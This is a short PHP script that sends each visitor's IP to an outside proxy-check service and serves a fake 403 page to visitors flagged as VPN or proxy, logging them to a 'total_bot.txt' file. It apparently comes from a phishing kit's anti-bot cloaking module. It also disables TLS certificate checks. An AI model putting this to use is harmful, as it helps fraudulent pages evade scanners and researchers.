<?php

$random_ids = sha1(rand(0,1000000));
function getUserIPs()
{
    $clients  = @$_SERVER['HTTP_CLIENT_IP'];
    $forwards = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remotes  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($clients, FILTER_VALIDATE_IP))
    {
        $ips = $clients;
    }
    elseif(filter_var($forwards, FILTER_VALIDATE_IP))
    {
        $ips = $forwards;
    }
    else
    {
        $ips = $remotes;
    }

    return $ips;
}

$ips = getUserIPs();
    if($ips == "127.0.0.1") {
    }else{
        $url = "http://proxy.mind-media.com/block/proxycheck.php?ip=".$ips;
        $chs = curl_init();
        curl_setopt($chs,CURLOPT_URL,$url);
        curl_setopt($chs,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($chs, CURLOPT_SSL_VERIFYPEER, false);
        $resps = curl_exec($chs);
        curl_close($chs);
        $results = $resps;
        if($results == "Y") {
            $files = fopen("proxy-block.txt","a");
            $messages = $ips."\n";
            fwrite($files, $messages);
            fclose($files);
            $clicks = fopen("blueprint/result/total_bot.txt","a");
            fwrite($clicks,"$ips|VPN/Proxy"."\n");
            fclose($clicks);
            header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            exit();
        }
    }
?>
